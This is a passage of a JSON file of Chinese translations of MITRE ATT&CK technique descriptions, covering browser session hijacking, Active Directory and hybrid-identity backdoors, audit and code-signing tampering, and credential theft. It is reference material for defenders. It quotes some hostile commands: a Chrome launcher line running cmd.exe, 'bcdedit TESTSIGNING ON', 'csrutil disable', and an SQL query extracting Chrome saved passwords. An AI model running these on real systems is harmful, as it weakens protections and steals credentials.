        "translated_description": "对手可能会利用浏览器软件中的安全漏洞和固有功能来更改内容、修改用户行为并拦截信息，作为各种浏览器会话劫持技术的一部分。(引用: Wikipedia Man in the Browser)\n\n一个具体的例子是对手将软件注入浏览器，使他们能够继承用户的cookie、HTTP会话和SSL客户端证书，然后使用浏览器作为进入已认证内联网的方式。(引用: Cobalt Strike Browser Pivot)(引用: ICEBRG Chrome Extensions) 执行基于浏览器的行为（如枢纽）可能需要特定的进程权限，例如<code>SeDebugPrivilege</code>和/或高完整性/管理员权限。\n\n另一个例子涉及通过设置代理将对手的浏览器流量通过用户的浏览器进行枢纽，该代理将重定向Web流量。这不会以任何方式更改用户的流量，并且代理连接可以在浏览器关闭后立即断开。对手假设代理注入的浏览器进程的安全上下文。浏览器通常为每个打开的标签创建一个新进程，并且权限和证书分别分开。拥有这些权限，对手可以潜在地浏览任何内联网资源，例如[Sharepoint](https://attack.mitre.org/techniques/T1213/002)或Webmail，只要浏览器具有足够的权限。浏览器枢纽还可能绕过双因素认证提供的安全性。(引用: cobaltstrike manual)"
    },
    "Remote Services": {
        "translated_name": "远程服务",
        "translated_description": "对手可能会使用[有效账户](https://attack.mitre.org/techniques/T1078)登录接受远程连接的服务，例如telnet、SSH和VNC。然后，对手可能会以登录用户的身份执行操作。\n\n在企业环境中，服务器和工作站可以组织成域。域提供集中身份管理，允许用户使用一组凭据登录整个网络。如果对手能够获得一组有效的域凭据，他们可以使用远程访问协议（如安全外壳（SSH）或远程桌面协议（RDP））登录到许多不同的机器。(引用: SSH Secure Shell)(引用: TechNet Remote Desktop Services) 他们还可以登录到可访问的SaaS或IaaS服务，例如那些将其身份联合到域的服务。\n\n合法应用程序（如[软件部署工具](https://attack.mitre.org/techniques/T1072)和其他管理程序）可能会利用[远程服务](https://attack.mitre.org/techniques/T1021)访问远程主机。例如，macOS上的Apple Remote Desktop（ARD）是用于远程管理的本机软件。ARD利用混合协议，包括[VNC](https://attack.mitre.org/techniques/T1021/005)发送屏幕和控制缓冲区，以及[SSH](https://attack.mitre.org/techniques/T1021/004)进行安全文件传输。(引用: Remote Management MDM macOS)(引用: Kickstart Apple Remote Desktop commands)(引用: Apple Remote Desktop Admin Guide 3.3) 对手可以滥用ARD等应用程序以获得远程代码执行并进行横向移动。在macOS 10.14之前的版本中，对手可以将SSH会话升级为ARD会话，从而使对手能够在无需用户交互的情况下接受TCC（透明度、同意和控制）提示并访问数据。(引用: FireEye 2019 Apple Remote Desktop)(引用: Lockboxx ARD 2019)(引用: Kickstart Apple Remote Desktop commands)"
    },
    "Mail Protocols": {
        "translated_name": "邮件协议",
        "translated_description": "对手可能会使用与电子邮件传输相关的应用层协议进行通信，以通过与现有流量混合来避免检测/网络过滤。发送到远程系统的命令以及这些命令的结果通常会嵌入在客户端和服务器之间的协议流量中。\n\n诸如SMTP/S、POP3/S和IMAP等传输电子邮件的协议在环境中可能非常常见。这些协议产生的数据包可能有许多字段和标头，可以隐藏数据。数据也可以隐藏在电子邮件消息本身中。对手可能会滥用这些协议与他们控制的系统进行通信，同时模仿正常、预期的流量。(引用: FireEye APT28)"
    },
    "Hybrid Identity": {
        "translated_name": "混合身份",
        "translated_description": "对手可能会修补、修改或以其他方式后门化与本地用户身份相关联的云身份验证过程，以绕过典型的身份验证机制、访问凭据并启用对账户的持久访问。\n\n许多组织维护在本地和云环境之间共享的混合用户和设备身份。这些身份可以通过多种方式维护。例如，Microsoft Entra ID包括三种同步Active Directory和Entra ID之间身份的选项(引用: Azure AD Hybrid Identity)：\n\n* 密码哈希同步（PHS），其中特权本地账户同步用户密码哈希值，使Entra ID的身份验证完全在云中进行\n* 直通身份验证（PTA），其中Entra ID身份验证尝试被转发到本地PTA代理，该代理根据Active Directory验证凭据\n* Active Directory联合服务（AD FS），其中在Active Directory和Entra ID之间建立信任关系\n\nAD FS还可以与其他SaaS和云平台（如AWS和GCP）一起使用，这些平台将身份验证过程交给AD FS并接收包含混合用户身份和权限的令牌。\n\n通过修改与混合身份相关的身份验证过程，对手可能能够建立对云资源的持久特权访问。例如，妥协运行PTA代理的本地服务器的对手可能会将恶意DLL注入`AzureADConnectAuthenticationAgentService`进程，该进程授权所有尝试对Entra ID进行身份验证的请求，并记录用户凭据。(引用: Azure AD Connect for Read Teamers)(引用: AADInternals Azure AD On-Prem to Cloud) 在使用AD FS的环境中，对手可能会编辑`Microsoft.IdentityServer.Servicehost`配置文件以加载生成任何用户的身份验证令牌的恶意DLL，从而绕过多因素认证和定义的AD FS策略。(引用: MagicWeb)\n\n在某些情况下，对手可能能够从云端修改混合身份身份验证过程。例如，妥协Entra ID租户中的全局管理员账户的对手可能能够通过Web控制台注册新的PTA代理，从而允许他们收集凭据并以任何用户身份登录Entra ID环境。(引用: Mandiant Azure AD Backdoors)"
    },
    "Vulnerability Scanning": {
        "translated_name": "漏洞扫描",
        "translated_description": "对手可能会扫描受害者的漏洞，以便在目标过程中使用。漏洞扫描通常检查目标主机/应用程序的配置（例如：软件和版本）是否可能与对手可能使用的特定漏洞利用目标一致。\n\n这些扫描还可能包括更广泛的尝试，以[收集受害者主机信息](https://attack.mitre.org/techniques/T1592)，这些信息可用于识别更常见的、可利用的漏洞。漏洞扫描通常通过服务器横幅、监听端口或其他网络工件收集运行的软件和版本号。(引用: OWASP Vuln Scanning) 来自这些扫描的信息可能会揭示其他形式的侦察机会（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如：[利用面向公众的应用程序](https://attack.mitre.org/techniques/T1190)）。"
    },
    "Cloud API": {
        "translated_name": "云API",
        "translated_description": "对手可能会滥用云API来执行恶意命令。云环境中的API提供各种功能，是以编程方式访问租户几乎所有方面的功能丰富的方法。这些API可以通过各种方法使用，例如命令行解释器（CLI）、浏览器中的Cloud Shell、[PowerShell](https://attack.mitre.org/techniques/T1059/001)模块（如Azure for PowerShell）(引用: Microsoft - Azure PowerShell)，或适用于[Python](https://attack.mitre.org/techniques/T1059/006)等语言的软件开发工具包（SDK）。\n\n云API功能可能允许跨租户中的所有主要服务（如计算、存储、身份和访问管理（IAM）、网络和安全策略）进行管理访问。\n\n在具有适当权限的情况下（通常通过使用[应用程序访问令牌](https://attack.mitre.org/techniques/T1550/001)和[Web会话Cookie](https://attack.mitre.org/techniques/T1550/004)等凭据），对手可能会滥用云API来调用各种执行恶意操作的功能。例如，可以通过安装在云托管或本地主机上的二进制文件访问CLI和PowerShell功能，或通过许多云平台（如AWS、Azure和GCP）提供的基于浏览器的Cloud Shell访问。这些Cloud Shell通常是一个打包的统一环境，用于使用CLI和/或托管在云环境中的脚本模块。"
    },
    "Search Open Technical Databases": {
        "translated_name": "搜索开放技术数据库",
        "translated_description": "对手可能会搜索自由可用的技术数据库，以获取有关受害者的信息，以便在目标过程中使用。有关受害者的信息可能在在线数据库和存储库中可用，例如域/证书的注册以及从流量和/或扫描中收集的网络数据/工件的公共集合。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS)(引用: Medium SSL Cert)(引用: SSLShopper Lookup)(引用: DigitalShadows CDN)(引用: Shodan)\n\n对手可能会根据他们希望收集的信息在不同的开放数据库中进行搜索。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如：[获取基础设施](https://attack.mitre.org/techniques/T1583)或[妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133)或[受信任关系](https://attack.mitre.org/techniques/T1199)）。"
    },
    "Electron Applications": {
        "translated_name": "Electron应用程序",
        "translated_description": "对手可能会滥用Electron框架的组件来执行恶意代码。Electron框架托管许多常见的应用程序，如Signal、Slack和Microsoft Teams。(引用: Electron 2) Electron最初由GitHub开发，是一个跨平台桌面应用程序开发框架，使用JavaScript、HTML和CSS等Web技术。(引用: Electron 3) Chromium引擎用于显示Web内容，Node.js运行后端代码。(引用: Electron 1)\n\n由于Electron的功能机制（例如允许应用程序运行任意命令），对手也可能能够在后台执行恶意功能，可能伪装成框架内的合法工具。(引用: Electron 1) 例如，滥用`teams.exe`和`chrome.exe`可能允许对手作为合法应用程序的子进程执行恶意命令（例如，`chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe\"`）。(引用: Electron 6-8)\n\n对手还可能通过在Electron应用程序中植入恶意[JavaScript](https://attack.mitre.org/techniques/T1059/007)来执行恶意内容。(引用: Electron Security)"
    },
    "Disable or Modify Linux Audit System": {
        "translated_name": "禁用或修改Linux审计系统",
        "translated_description": "对手可能会禁用或修改Linux审计系统，以隐藏恶意活动并避免检测。Linux管理员使用Linux审计系统跟踪系统上的安全相关信息。Linux审计系统在内核级别运行，并根据预配置的规则维护应用程序和系统活动（如进程、网络、文件和登录事件）的事件日志。\n\n通常称为`auditd`，这是用于将事件写入磁盘的守护进程的名称，并由`audit.conf`配置文件中设置的参数管理。配置日志生成规则的两种主要方法是通过命令行`auditctl`实用程序和包含一系列`auditctl`命令的文件`/etc/audit/audit.rules`，这些命令在启动时加载。(引用: Red Hat System Auditing)(引用: IzyKnows auditd threat detection 2022)\n\n具有root权限的对手可能能够通过禁用Audit系统服务、编辑配置/规则文件或挂钩Audit系统库函数来确保其活动不被记录。使用命令行，对手可以通过杀死与`auditd`守护进程相关的进程或使用`systemctl`停止Audit服务来禁用Audit系统服务。对手还可以挂钩Audit系统函数以禁用日志记录或修改`/etc/audit/audit.rules`或`audit.conf`文件中的规则以忽略恶意活动。(引用: Trustwave Honeypot SkidMap 2023)(引用: ESET Ebury Feb 2014)"
    },
    "Rogue Domain Controller": {
        "translated_name": "恶意域控制器",
        "translated_description": "对手可能会注册一个恶意域控制器，以便操纵Active Directory数据。DCShadow可能被用来创建一个恶意域控制器（DC）。DCShadow是一种通过注册（或重新使用不活动的注册）并模拟DC的行为来操纵Active Directory（AD）数据（包括对象和架构）的方法。(引用: DCShadow Blog) 一旦注册，恶意DC可能能够将更改注入并复制到AD基础设施中的任何域对象，包括凭据和密钥。\n\n注册恶意DC涉及在AD架构的配置分区中创建新的服务器和nTDSDSA对象，这需要管理员权限（域管理员或本地DC管理员）或KRBTGT哈希。(引用: Adsecurity Mimikatz Guide)\n\n此技术可能绕过系统日志记录和安全监控工具（如安全信息和事件管理（SIEM）产品），因为在恶意DC上执行的操作可能不会报告给这些传感器。(引用: DCShadow Blog) 此技术还可以用于更改和删除复制和其他相关元数据，以阻碍法医分析。对手还可能利用此技术执行[SID历史注入](https://attack.mitre.org/techniques/T1134/005)和/或操纵AD对象（如账户、访问控制列表、架构）以建立持久性后门。(引用: DCShadow Blog)"
    },
    "Code Signing Policy Modification": {
        "translated_name": "代码签名策略修改",
        "translated_description": "对手可能会修改代码签名策略，以允许执行未签名或自签名的代码。代码签名为程序提供了一定程度的真实性，并保证程序未被篡改。安全控制可以包括强制机制，以确保只有有效签名的代码才能在操作系统上运行。\n\n其中一些安全控制可能默认启用，例如Windows上的驱动程序签名强制（DSE）或macOS上的系统完整性保护（SIP）。(引用: Microsoft DSE June 2017)(引用: Apple Disable SIP) 其他此类控制可能默认禁用，但可以通过应用程序控制进行配置，例如仅允许签名的动态链接库（DLL）在系统上执行。由于在开发和测试应用程序期间修改默认签名强制策略对开发人员可能有用，因此在具有提升权限的情况下可能禁用这些功能。(引用: Microsoft Unsigned Driver Apr 2017)(引用: Apple Disable SIP)\n\n对手可能会通过多种方式修改代码签名策略，包括使用命令行或GUI实用程序、[修改注册表](https://attack.mitre.org/techniques/T1112)、在调试/恢复模式下重新启动计算机，或通过更改内核内存中的变量值。(引用: Microsoft TESTSIGNING Feb 2021)(引用: Apple Disable SIP)(引用: FireEye HIKIT Rootkit Part 2)(引用: GitHub Turla Driver Loader) 可以修改系统代码签名策略的命令示例包括Windows上的<code>bcdedit.exe -set TESTSIGNING ON</code>和macOS上的<code>csrutil disable</code>。(引用: Microsoft TESTSIGNING Feb 2021)(引用: Apple Disable SIP) 根据实现情况，成功修改签名策略可能需要重新启动受损系统。此外，一些实现可能会为用户引入可见的工件（例如：屏幕角落的水印，表明系统处于测试模式）。对手可能会尝试删除这些工件。(引用: F-Secure BlackEnergy 2014)\n\n为了访问内核内存以修改与签名检查相关的变量，例如修改<code>g_CiOptions</code>以禁用驱动程序签名强制，对手可能会使用签名但易受攻击的驱动程序进行[特权提升利用](https://attack.mitre.org/techniques/T1068)。(引用: Unit42 AcidBox June 2020)(引用: GitHub Turla Driver Loader)"
    },
    "Deploy Container": {
        "translated_name": "部署容器",
        "translated_description": "对手可能会在环境中部署容器以促进执行或规避防御。在某些情况下，对手可能会部署一个新容器来执行与特定镜像或部署相关的进程，例如执行或下载恶意软件的进程。在其他情况下，对手可能会部署一个没有网络规则、用户限制等配置的新容器，以绕过环境中的现有防御。在Kubernetes环境中，对手可能会尝试在特定节点上部署一个特权或易受攻击的容器，以便[逃逸到主机](https://attack.mitre.org/techniques/T1611)并访问节点上运行的其他容器。(引用: AppSecco Kubernetes Namespace Breakout 2020)\n\n容器可以通过多种方式部署，例如通过Docker的<code>create</code>和<code>start</code> API或通过Kubernetes仪表板或Kubeflow等Web应用程序。(引用: Docker Containers API)(引用: Kubernetes Dashboard)(引用: Kubeflow Pipelines) 在Kubernetes环境中，容器可以通过工作负载如ReplicaSets或DaemonSets部署，这可以允许容器在多个节点上部署。(引用: Kubernetes Workload Management) 对手可能会基于检索到的或构建的恶意镜像或从运行时下载并执行恶意有效负载的良性镜像部署容器。(引用: Aqua Build Images on Hosts)"
    },
    "Modify Registry": {
        "translated_name": "修改注册表",
        "translated_description": "对手可能会与Windows注册表交互，以在注册表项中隐藏配置信息，删除信息作为清理的一部分，或作为其他技术的一部分以帮助持久性和执行。\n\n访问注册表的特定区域取决于帐户权限，有些需要管理员级别的访问权限。内置的Windows命令行实用程序[Reg](https://attack.mitre.org/software/S0075)可用于本地或远程注册表修改。(引用: Microsoft Reg) 其他工具也可以使用，例如远程访问工具，它可能包含通过Windows API与注册表交互的功能。\n\n注册表修改还可能包括隐藏键的操作，例如在键名之前添加一个空字符，这将在通过[Reg](https://attack.mitre.org/software/S0075)或其他使用Win32 API的实用程序读取时导致错误和/或被忽略。(引用: Microsoft Reghide NOV 2006) 对手可能会滥用这些伪隐藏键来隐藏用于保持持久性的有效负载/命令。(引用: TrendMicro POWELIKS AUG 2014) (引用: SpectorOps Hiding Reg Jul 2017)\n\n远程系统的注册表可能会被修改以帮助执行文件作为横向移动的一部分。这需要目标系统上运行远程注册表服务。(引用: Microsoft Remote) 通常需要[有效帐户](https://attack.mitre.org/techniques/T1078)，以及访问远程系统的[SMB/Windows管理员共享](https://attack.mitre.org/techniques/T1021/002)以进行RPC通信。"
    },
    "Launch Daemon": {
        "translated_name": "启动守护程序",
        "translated_description": "对手可能会创建或修改启动守护程序以执行恶意有效负载作为持久性的一部分。启动守护程序是用于与Launchd交互的plist文件，Launchd是macOS使用的服务管理框架。安装启动守护程序需要提升的权限，它们在系统登录前为每个用户执行，并在后台运行而无需用户交互。在macOS初始化启动期间，launchd进程从<code>/System/Library/LaunchDaemons/</code>和<code>/Library/LaunchDaemons/</code>中的plist文件加载按需启动的系统级守护程序的参数。启动守护程序的必需参数包括用于标识任务的<code>Label</code>，提供可执行文件路径的<code>Program</code>，以及指定任务何时运行的<code>RunAtLoad</code>。启动守护程序通常用于提供对共享资源的访问、软件更新或执行自动化任务。(引用: AppleDocs Launch Agent Daemons)(引用: Methods of Mac Malware Persistence)(引用: launchd Keywords for plists)\n\n对手可能会通过使用<code>RunAtLoad</code>参数设置为<code>true</code>和<code>Program</code>参数设置为恶意可执行文件路径来安装配置为在启动时执行的启动守护程序。守护程序名称可能会通过使用相关操作系统或良性软件的名称进行伪装（即[伪装](https://attack.mitre.org/techniques/T1036)）。当启动守护程序执行时，程序继承管理员权限。(引用: WireLurker)(引用: OSX Malware Detection)\n\n此外，系统配置更改（例如安装第三方包管理软件）可能会导致文件夹如<code>usr/local/bin</code>变得全局可写。因此，配置不当可能允许对手修改当前启动守护程序的plist文件引用的可执行文件。(引用: LaunchDaemon Hijacking)(引用: sentinelone macos persist Jun 2019)"
    },
    "Cloud Infrastructure Discovery": {
        "translated_name": "云基础设施发现",
        "translated_description": "对手可能会尝试发现基础设施即服务（IaaS）环境中可用的基础设施和资源。这包括计算服务资源，如实例、虚拟机和快照，以及其他服务的资源，包括存储和数据库服务。\n\n云提供商提供的方法，如API和通过CLI发出的命令，以提供有关基础设施的信息。例如，AWS提供了一个<code>DescribeInstances</code> API，它可以返回帐户中一个或多个实例的信息，<code>ListBuckets</code> API返回请求发送者拥有的所有存储桶的列表，<code>HeadBucket</code> API确定存储桶的存在以及请求发送者的访问权限，或<code>GetPublicAccessBlock</code> API检索存储桶的访问块配置。(引用: Amazon Describe Instance)(引用: Amazon Describe Instances API)(引用: AWS Get Public Access Block)(引用: AWS Head Bucket) 类似地，GCP的Cloud SDK CLI提供了<code>gcloud compute instances list</code>命令，以列出项目中的所有Google Compute Engine实例。(引用: Google Compute Instances)，Azure的CLI命令<code>az vm list</code>列出虚拟机的详细信息。(引用: Microsoft AZ CLI) 除了API命令，对手还可以利用开源工具通过[字典扫描](https://attack.mitre.org/techniques/T1595/003)发现云存储基础设施。(引用: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\n对手可能会使用被破坏用户的访问密钥枚举资源，以确定哪些资源对该用户可用。(引用: Expel IO Evil in AWS) 这些可用资源的发现可能会帮助对手确定他们在云环境中的下一步，例如建立持久性。(引用: Mandiant M-Trends 2020)对手还可能使用此信息更改配置，使存储桶公开访问，允许在未经身份验证的情况下访问数据。对手还可能使用基础设施发现API，如<code>DescribeDBInstances</code>，以确定数据库资源的大小、所有者、权限和网络ACL。(引用: AWS Describe DB Instances) 对手可以使用此信息确定数据库的潜在价值并发现访问它们的要求。与[云服务发现](https://attack.mitre.org/techniques/T1526)不同，此技术侧重于发现提供的服务的组件，而不是服务本身。"
    },
    "Credentials from Web Browsers": {
        "translated_name": "来自Web浏览器的凭据",
        "translated_description": "对手可能通过读取特定于目标浏览器的文件获取Web浏览器中的凭据。(引用: Talos Olympic Destroyer 2018) Web浏览器通常会保存凭据，如网站用户名和密码，以便将来无需手动输入。Web浏览器通常将凭据以加密格式存储在凭据存储中；然而，存在从Web浏览器中提取明文凭据的方法。\n\n例如，在Windows系统上，可以通过读取数据库文件<code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>并执行SQL查询<code>SELECT action_url, username_value, password_value FROM logins;</code>获取Google Chrome的加密凭据。然后可以通过将加密凭据传递给Windows API函数<code>CryptUnprotectData</code>来获取明文密码，该函数使用受害者缓存的登录凭据作为解密密钥。(引用: Microsoft CryptUnprotectData April 2018)\n \n对手已经对常见的Web浏览器（如FireFox、Safari、Edge等）执行了类似的程序。(引用: Proofpoint Vega Credential Stealer May 2018)(引用: FireEye HawkEye Malware July 2017) Windows将Internet Explorer和Microsoft Edge凭据存储在由[Windows凭据管理器](https://attack.mitre.org/techniques/T1555/004)管理的凭据锁中。\n\n对手还可能通过搜索Web浏览器进程内存中的常见匹配凭据的模式获取凭据。(引用: GitHub Mimikittenz July 2016)\n\n在获取Web浏览器中的凭据后，对手可能会尝试在不同系统和/或帐户中重复使用这些凭据，以扩展访问权限。在凭据与特权帐户（例如域管理员）重叠的情况下，这可能显著推进对手的目标。"
    },
    "Path Interception by Search Order Hijacking": {
        "translated_name": "通过搜索顺序劫持进行路径拦截",
        "translated_description": "对手可能通过劫持用于加载其他程序的搜索顺序来执行他们自己的恶意有效负载。由于某些程序在调用其他程序时不使用完整路径，对手可能会将他们自己的文件放置在调用程序所在的目录中，从而导致操作系统在调用程序的请求下启动他们的恶意软件。\n\n搜索顺序劫持发生在对手滥用Windows搜索未指定路径的程序的顺序时。与[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)不同，搜索顺序因执行程序的方法而异。(引用: Microsoft CreateProcess) (引用: Windows NT Command Shell) (引用: Microsoft WinExec) 然而，Windows通常会在搜索Windows系统目录之前搜索启动程序的目录。发现易受搜索顺序劫持（即未指定可执行文件路径）的程序的对手可能会通过在启动程序的目录中创建一个命名为不正确指定程序的程序来利用此漏洞。\n\n例如，“example.exe”运行“cmd.exe”并带有命令行参数<code>net user</code>。对手可能会在example.exe所在的目录中放置一个名为“net.exe”的程序，“net.exe”将被运行而不是Windows系统实用程序net。此外，如果对手在与“net.exe”相同的目录中放置一个名为“net.com”的程序，那么<code>cmd.exe /C net user</code>将执行“net.com”而不是“net.exe”，因为在PATHEXT下定义的可执行文件扩展名顺序。(引用: Microsoft Environment Property)\n\n搜索顺序劫持也是劫持DLL加载的常见做法，并在[DLL搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001)中进行了介绍。"
    },
    "Defacement": {
        "translated_name": "篡改",
        "translated_description": "对手可能会修改企业网络内部或外部可用的视觉内容，从而影响原始内容的完整性。篡改的原因包括传递信息、恐吓或声称（可能是虚假的）入侵信用。令人不安或冒犯的图像可能作为篡改的一部分使用，以引起用户的不适，或迫使其遵守附带的信息。\n"
    },
    "Unused/Unsupported Cloud Regions": {
        "translated_name": "未使用/不支持的云区域",
        "translated_description": "对手可能会在未使用的地理服务区域中创建云实例，以逃避检测。通常通过破坏用于管理云基础设施的帐户获得访问权限。\n\n云服务提供商通常在全球范围内提供基础设施，以提高性能、提供冗余并允许客户满足合规要求。通常，客户只会使用可用区域的子集，并且可能不会主动监控其他区域。如果对手在未使用的区域中创建资源，他们可能能够在不被发现的情况下操作。\n\n这种行为的一个变体利用了云区域之间功能的差异。对手可以利用不支持高级检测服务的区域，以避免检测其活动。\n\n对手使用未使用的AWS区域的一个例子是通过[资源劫持](https://attack.mitre.org/techniques/T1496)挖掘加密货币，这可能会随着时间的推移根据使用的处理能力花费组织大量资金。(引用: CloudSploit - Unused AWS Regions)"
    },
    "DHCP Spoofing": {
        "translated_name": "DHCP 欺骗",
        "translated_description": "对手可能通过伪造动态主机配置协议 (DHCP) 流量并充当受害网络上的恶意 DHCP 服务器来重定向网络流量到对手拥有的系统。通过实现对手中间人 (AiTM) 位置，对手可能会收集网络通信，包括通过不安全、未加密协议传递的凭据。这也可能启用后续行为，例如[网络嗅探](https://attack.mitre.org/techniques/T1040)或[传输数据操纵](https://attack.mitre.org/techniques/T1565/002)。\n\nDHCP 基于客户端-服务器模型，具有两种功能：从 DHCP 服务器向客户端提供网络配置设置的协议和向客户端分配网络地址的机制。(引用: rfc2131) 典型的服务器-客户端交互如下：\n\n1. 客户端广播 `DISCOVER` 消息。\n\n2. 服务器响应 `OFFER` 消息，其中包括可用的网络地址。\n\n3. 客户端广播 `REQUEST` 消息，其中包括提供的网络地址。\n\n4. 服务器通过 `ACK` 消息确认，客户端接收网络配置参数。\n\n对手可能会在受害网络上伪装成流氓 DHCP 服务器，合法主机可能会从中接收恶意网络配置。例如，恶意软件可以充当 DHCP 服务器并向受害计算机提供对手拥有的 DNS 服务器。(引用: new_rogue_DHCP_serv_malware)(引用: w32.tidserv.g) 通过恶意网络配置，对手可能实现 AiTM 位置，通过对手控制的系统路由客户端流量，并从客户端网络收集信息。\n\nDHCPv6 客户端可以在不分配 IP 地址的情况下接收网络配置信息，方法是向 <code>All_DHCP_Relay_Agents_and_Servers</code> 多播地址发送 <code>INFORMATION-REQUEST (code 11)</code> 消息。(引用: rfc3315) 对手可能使用其流氓 DHCP 服务器响应此请求消息，提供恶意网络配置。\n\n对手可能还会滥用 DHCP 欺骗执行 DHCP 耗尽攻击（即，[服务耗尽泛洪](https://attack.mitre.org/techniques/T1499/002)），通过生成许多广播 DISCOVER 消息来耗尽网络的 DHCP 分配池。"
    },
    "Remote Service Session Hijacking": {
        "translated_name": "远程服务会话劫持",
        "translated_description": "对手可能会控制与远程服务的现有会话，以在环境中横向移动。用户可能使用有效凭据登录到专门接受远程连接的服务，例如 telnet、SSH 和 RDP。当用户登录到服务时，将建立一个会话，允许他们与该服务保持连续交互。\n\n对手可能会劫持这些会话在远程系统上执行操作。[远程服务会话劫持](https://attack.mitre.org/techniques/T1563) 与使用[远程服务](https://attack.mitre.org/techniques/T1021)不同，因为它劫持现有会话，而不是使用[有效账户](https://attack.mitre.org/techniques/T1078)创建新会话。(引用: RDP Hijacking Medium)(引用: Breach Post-mortem SSH Hijack)"
    },
    "Binary Padding": {
        "translated_name": "二进制填充",
        "translated_description": "对手可能使用二进制填充添加垃圾数据并更改恶意软件的磁盘表示。这可以在不影响二进制文件功能或行为的情况下完成，但可以将二进制文件的大小增加到某些安全工具由于文件大小限制而无法处理的程度。\n\n二进制填充有效地更改了文件的校验和，还可以用于避免基于哈希的黑名单和静态防病毒签名。(引用: ESET OceanLotus) 填充通常由函数生成垃圾数据，然后附加到末尾或应用于恶意软件的部分。(引用: Securelist Malware Tricks April 2017) 增加文件大小可能会降低某些工具和检测能力的有效性，这些工具和检测能力未设计或配置为扫描大文件。这也可能减少被收集进行分析的可能性。公共文件扫描服务（如 VirusTotal）限制上传文件的最大分析大小。(引用: VirusTotal FAQ)"
    },
    "Web Shell": {
        "translated_name": "Web Shell",
        "translated_description": "对手可能会在 Web 服务器上植入 Web shell 以建立对系统的持久访问。Web shell 是放置在公开可访问的 Web 服务器上的 Web 脚本，允许对手访问 Web 服务器作为进入网络的网关。Web shell 可能提供一组功能来执行或在托管 Web 服务器的系统上提供命令行界面。(引用: volexity_0day_sophos_FW)\n\n除了服务器端脚本，Web shell 可能还有一个客户端界面程序，用于与 Web 服务器通信（例如，[China Chopper](https://attack.mitre.org/software/S0020) Web shell 客户端）。(引用: Lee 2013)"
    },
    "Group Policy Modification": {
        "translated_name": "组策略修改",
        "translated_description": "对手可能会修改组策略对象 (GPO) 以颠覆域的预期自由访问控制，通常是为了在域上提升权限。组策略允许在 Active Directory (AD) 中集中管理用户和计算机设置。GPO 是包含组策略设置的容器，由存储在可预测网络路径 `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\` 中的文件组成。(引用: TechNet Group Policy Basics)(引用: ADSecurity GPO Persistence 2016)\n\n与 AD 中的其他对象一样，GPO 具有与之关联的访问控制。默认情况下，域中的所有用户帐户都有读取 GPO 的权限。可以将 GPO 访问控制权限（例如写入访问权限）委派给域中的特定用户或组。\n\n恶意 GPO 修改可用于实现许多其他恶意行为，例如[计划任务/作业](https://attack.mitre.org/techniques/T1053)、[禁用或修改工具](https://attack.mitre.org/techniques/T1562/001)、[入口工具传输](https://attack.mitre.org/techniques/T1105)、[创建账户](https://attack.mitre.org/techniques/T1136)、[服务执行](https://attack.mitre.org/techniques/T1569/002)等。(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)(引用: Mandiant M Trends 2016)(引用: Microsoft Hacking Team Breach) 由于 GPO 可以控制 AD 环境中的许多用户和计算机设置，因此可能会出现大量潜在攻击。(引用: Wald0 Guide to GPOs)\n\n例如，可以利用公开可用的脚本（如 <code>New-GPOImmediateTask</code>）通过修改 GPO 设置自动创建恶意[计划任务/作业](https://attack.mitre.org/techniques/T1053)，在这种情况下，修改 <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>。(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions) 在某些情况下，对手可能会修改特定用户权限，如 SeEnableDelegationPrivilege，设置在 <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code> 中，以实现对域的完全控制，因为对手控制的用户帐户将能够修改 GPO。(引用: Harmj0y SeEnableDelegationPrivilege Right)"
    },
    "Browser Information Discovery": {
        "translated_name": "浏览器信息发现",
        "translated_description": "对手可能会枚举有关浏览器的信息，以了解更多有关受损环境的信息。浏览器保存的数据（如书签、账户和浏览历史记录）可能会揭示有关用户的各种个人信息（例如，银行网站、关系/兴趣、社交媒体等）以及有关内部网络资源的详细信息，例如服务器、工具/仪表板或其他相关基础设施。(引用: Kaspersky Autofill)\n\n浏览器信息还可能在对手访问有效凭据后突出显示其他目标，尤其是与浏览器缓存的登录相关的[文件中的凭据](https://attack.mitre.org/techniques/T1552/001)。\n\n具体存储位置因平台和/或应用程序而异，但浏览器信息通常存储在本地文件和数据库中（例如，`%APPDATA%/Google/Chrome`）。(引用: Chrome Roaming Profiles)"
    },
    "Private Keys": {
        "translated_name": "私钥",
        "translated_description": "对手可能会在受损系统上搜索私钥证书文件，以查找不安全存储的凭据。私有加密密钥和证书用于身份验证、加密/解密和数字签名。(引用: Wikipedia Public Key Crypto) 常见的密钥和证书文件扩展名包括：.key、.pgp、.gpg、.ppk、.p12、.pem、.pfx、.cer、.p7b、.asc。\n\n对手可能还会在常见密钥目录中查找，例如 * nix 系统上的 <code>~/.ssh</code> 或 Windows 上的 <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code>。对手工具还可能在受损系统上搜索与加密密钥和证书相关的文件扩展名。(引用: Kaspersky Careto)(引用: Palo Alto Prince of Persia)\n\n当设备注册到 Entra ID 时，会生成设备密钥和传输密钥，用于验证设备的身份。(引用: Microsoft Primary Refresh Token) 对手访问设备后，可能能够导出密钥以冒充设备。(引用: AADInternals Azure AD Device Identities)\n\n在网络设备上，私钥可以通过[网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 命令（如 `crypto pki export`）导出。(引用: 